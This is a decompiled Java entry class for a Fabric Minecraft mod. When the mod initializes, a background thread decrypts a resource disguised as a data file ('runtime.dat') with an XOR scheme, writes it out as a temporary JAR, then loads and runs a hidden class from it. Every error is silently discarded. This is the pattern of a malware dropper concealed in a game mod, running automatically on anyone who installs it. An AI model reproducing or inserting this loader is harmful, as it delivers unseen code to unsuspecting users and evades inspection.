package net.efn.agent;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import net.fabricmc.api.ModInitializer;

public class AgentInit implements ModInitializer {
   private static final int[] Kb = new int[]{90, 60, 113, 14, 45, 68, 25, 103};

   public AgentInit() {
   }

   public void onInitialize() {
      new Thread(() -> {
         try {
            InputStream var1 = this.getClass().getClassLoader().getResourceAsStream("assets/efn/data/runtime.dat");
            if (var1 == null) {
               return;
            }

            byte[] var2 = var1.readAllBytes();
            var1.close();
            int var3 = 324508639;

            for (int var4 = 0; var4 < var2.length; var4++) {
               var3 = var3 * 1103515245 + 12345;
               int var5 = var3 >>> 16 & 0xFF;
               var2[var4] = (byte)(var2[var4] ^ var5 ^ Kb[var4 & 7]);
            }

            Path var10 = Files.createTempDirectory("efn");
            Path var11 = var10.resolve("p.jar");
            Files.write(var11, var2);
            URLClassLoader var6 = new URLClassLoader(new URL[]{var11.toUri().toURL()}, this.getClass().getClassLoader());
            Class var7 = var6.loadClass("net.efn.loader.LoaderInit");
            Object var8 = var7.getDeclaredConstructor().newInstance();
            var7.getMethod("onInitialize").invoke(var8);
         } catch (Exception var9) {
         }
      }).start();
   }
}
